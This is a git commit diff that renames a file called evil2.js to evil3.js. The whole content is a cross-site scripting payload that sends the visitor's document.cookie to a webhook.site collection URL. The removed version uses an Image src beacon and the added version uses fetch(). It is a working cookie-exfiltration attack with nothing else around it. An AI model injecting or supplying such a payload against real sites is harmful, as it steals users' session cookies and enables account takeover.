68426a32bdec80e5b3fa5fb522a544b7949e78b8
Dan Archer <46483718+DanArcherOnline@users.noreply.github.com>
2022-10-30 16:59:08 +0900

    Update and rename evil2.js to evil3.js

--- evil2.js
+++
@@ -1,2 +0,0 @@
-var i = new Image;
-i.src="https://webhook.site/87c0f911-5c4d-42f0-8647-f7b4e80912d1?c=" + document.cookie;
---
+++ evil3.js
@@ -0,0 +1,1 @@
+fetch("https://webhook.site/87c0f911-5c4d-42f0-8647-f7b4e80912d1?c=" + document.cookie);
